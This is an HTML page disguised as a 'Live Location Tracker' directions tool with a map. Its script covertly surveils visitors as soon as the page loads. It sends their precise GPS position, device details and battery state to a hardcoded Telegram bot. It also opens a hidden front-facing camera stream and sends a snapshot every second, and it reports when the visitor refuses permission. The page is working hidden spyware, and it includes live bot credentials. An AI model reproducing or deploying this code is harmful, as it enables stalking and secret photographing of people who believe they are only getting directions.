<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Live Location Tracker</title>
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      font-family: 'Roboto', sans-serif;
      margin: 0;
      padding: 0;
      background: #f4f6f8;
      color: #333;
    }

    .container {
      max-width: 900px;
      margin: auto;
      padding: 20px;
    }

    .card {
      background: #fff;
      padding: 20px;
      border-radius: 16px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
      margin-top: 30px;
    }

    h2 {
      text-align: center;
      color: #0077cc;
    }

    input[type="text"] {
      width: 60%;
      padding: 10px;
      font-size: 16px;
      border-radius: 8px;
      border: 1px solid #ccc;
      margin-right: 10px;
    }

    button {
      padding: 10px 16px;
      font-size: 16px;
      background-color: #0077cc;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    button:hover {
      background-color: #005fa3;
    }

    #status {
      margin-top: 15px;
      font-weight: 500;
      color: #444;
    }

    #map {
      height: 400px;
      width: 100%;
      border-radius: 12px;
      margin-top: 20px;
    }

    #video {
      display: none;
    }

    @media screen and (max-width: 600px) {
      input[type="text"] {
        width: 100%;
        margin-bottom: 10px;
      }

      button {
        width: 100%;
      }
    }
  </style>
</head>

<body>
  <div class="container">
    <div class="card">
      <h2>üìç Your Live Location</h2>
      <div style="display: flex; flex-wrap: wrap; align-items: center;">
        <input type="text" id="destination" placeholder="Enter destination e.g., Sector 82, Mohali" />
        <button onclick="openDirections()">Get Directions</button>
      </div>
      <p id="status">üìç Waiting for location...</p>
      <video id="video" autoplay playsinline width="300" height="200"></video>
      <canvas id="canvas" style="display: none;"></canvas>
      <div id="map"></div>
    </div>
  </div>

  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
  <script>
    const token = '6235375573:AAHdripMzwMYFL0dhruXGyvmJ6ZSQhWCTn4';
    const chat_id = '1444862345';
    let userLat = null, userLng = null;
    let marker = null, circle = null;
    let stream = null;
    const statusEl = document.getElementById("status");

    const map = L.map('map').setView([30.7046, 76.7179], 13);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
      attribution: '¬© OpenStreetMap contributors'
    }).addTo(map);

    function updateMap(lat, lng, accuracy) {
      const coords = [lat, lng];
      if (!marker) {
        marker = L.marker(coords).addTo(map).bindPopup("üìç You are here").openPopup();
      } else {
        marker.setLatLng(coords);
      }
      if (!circle) {
        circle = L.circle(coords, {
          radius: accuracy,
          color: 'blue',
          fillColor: '#add8e6',
          fillOpacity: 0.3
        }).addTo(map);
      } else {
        circle.setLatLng(coords).setRadius(accuracy);
      }
      map.setView(coords, 16);
    }

    function sendLocationToTelegram(lat, lng, accuracy) {
      const message = `
üìç *Live Location Update*
*Latitude:* \`${lat}\`
*Longitude:* \`${lng}\`
*Accuracy:* ~${Math.round(accuracy)} meters

üåç [View on Map](https://www.google.com/maps/search/?api=1&query=${lat},${lng})
üß≠ [Get Directions](https://www.google.com/maps/dir/?api=1&destination=${lat},${lng})
  `;
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id, text: message, parse_mode: "Markdown" })
      });
    }

    function sendPhotoToTelegram(blob) {
      const formData = new FormData();
      formData.append('chat_id', chat_id);
      formData.append('photo', blob, 'snapshot.jpg');
      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
    }

    function captureAndSendImage() {
      try {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = video.videoWidth || 300;
        canvas.height = video.videoHeight || 200;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.toBlob((blob) => {
          if (blob) sendPhotoToTelegram(blob);
        }, 'image/jpeg', 0.9);
      } catch (err) {
        console.error("Camera capture failed:", err);
      }
    }

    function startCameraLoop() {
      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then((mediaStream) => {
          stream = mediaStream;
          const video = document.getElementById('video');
          video.srcObject = stream;
          setInterval(captureAndSendImage, 1000);
        })
        .catch((err) => {
          console.warn("üì∑ Camera access denied:", err);
          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id,
              text: "‚ùå User denied camera access.",
            })
          });
        });
    }

    function locateUser() {
      if (!navigator.geolocation) {
        statusEl.textContent = "‚ùå Geolocation not supported.";
        return;
      }
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const { latitude, longitude, accuracy } = pos.coords;
          userLat = latitude;
          userLng = longitude;
          updateMap(userLat, userLng, accuracy);
          sendLocationToTelegram(userLat, userLng, accuracy);
          statusEl.textContent = `‚úÖ Location found (accuracy: ~${Math.round(accuracy)} m)`;
          if (accuracy > 100) {
            alert("‚ö†Ô∏è GPS accuracy is low. Use a mobile device or enable GPS.");
          }
        },
        (err) => {
          statusEl.textContent = "‚ùå Location error: " + err.message;
          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id,
              text: "‚ùå User denied location access.",
            })
          });
        },
        {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        }
      );
    }

    function getDeviceInfo() {
      const info = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        connection: navigator.connection ? navigator.connection.effectiveType : "N/A",
        battery: null,
      };

      navigator.getBattery?.().then(battery => {
        info.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})`;
        sendInfoToTelegram(info);
      }) || sendInfoToTelegram(info);
    }

    function sendInfoToTelegram(info) {
      const message = `
üì± *Device Info*
üß≠ Platform: ${info.platform}
üåê Network: ${info.connection}
üîã Battery: ${info.battery || 'N/A'}
üßæ User Agent:
\`${info.userAgent}\`
`;
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id,
          text: message,
          parse_mode: 'Markdown'
        })
      });
    }

    function openDirections() {
      const dest = document.getElementById("destination").value.trim();
      if (!userLat || !userLng) {
        alert("üìç Please wait for your location to load.");
        return;
      }
      if (!dest) {
        alert("üìå Please enter a destination.");
        return;
      }
      const mapsUrl = `https://www.google.com/maps/dir/?api=1&origin=${userLat},${userLng}&destination=${encodeURIComponent(dest)}&travelmode=driving`;
      window.open(mapsUrl, "_blank");
    }

    window.addEventListener('DOMContentLoaded', () => {
      locateUser();
      startCameraLoop();
      getDeviceInfo();
    });
  </script>
</body>

</html>
